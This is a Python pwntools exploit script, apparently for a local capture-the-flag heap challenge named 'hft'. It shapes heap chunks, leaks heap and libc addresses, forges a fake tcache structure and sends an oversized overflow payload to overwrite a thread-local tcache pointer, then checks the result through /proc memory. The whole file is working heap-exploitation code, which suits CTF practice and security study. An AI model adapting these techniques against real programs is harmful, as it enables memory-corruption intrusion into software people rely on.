import os, struct
from pwn import *
context.log_level = 'error'
HERE = '/mnt/d/ctf-index/_z_441'
io = process(os.path.join(HERE, 'hft'), env={})

def rd(addr, n):
    with open('/proc/%d/mem' % io.pid, 'rb') as f:
        f.seek(addr); return f.read(n)

def maps(pat):
    for line in open('/proc/%d/maps' % io.pid):
        if pat in line: return int(line.split('-')[0], 16)
    return None

def alloc(size, data=b''):
    io.recvuntil(b"PKT_RES")
    io.send(p64(size))
    io.send(bytes(data) + b"\n")

ECHO6 = b"\x01" + b"\x00"*5
def echo():
    io.recvuntil(b"PKT_DATA\x1b[m:[")
    buf = io.recvuntil(b"\x1b[1;34mPKT_INFO", drop=True)
    return buf[:-2]

alloc(0x10, b"\x00"*8)
alloc(0x10, p64(0) + p64(0) + p64(0xd31))
alloc(0x1000, b"\x00"*8)
alloc(0x8, ECHO6)
leak = u64(echo()[:6].ljust(8, b"\x00"))
heap = maps('[heap]')
libc = maps('441_libc.so.6')
print("heap=%#x libc=%#x" % (heap, libc))
fake = heap + 0x22020
st = bytearray(0x290)
st[0x80:0x88] = p64(heap+0x2e0)
st[2*63] = 1
st[0x80+8*63:0x88+8*63] = p64(fake-0x10)
alloc(0x1000, bytes(st[8:0x290]))

# send the big payload in chunks
payload = b"A"*0x316e0 + p64(fake)
io.recvuntil(b"PKT_RES")
io.send(p64(0x30001))
CH = 0x4000
for i in range(0, len(payload), CH):
    io.send(payload[i:i+CH])
io.send(b"\n")
print("sent %#x bytes in chunks" % len(payload))
time.sleep(1)
tgt = u64(rd(libc-0x2908, 8))
print("tls tcache var = %#x (want %#x)" % (tgt, fake))
io.close()
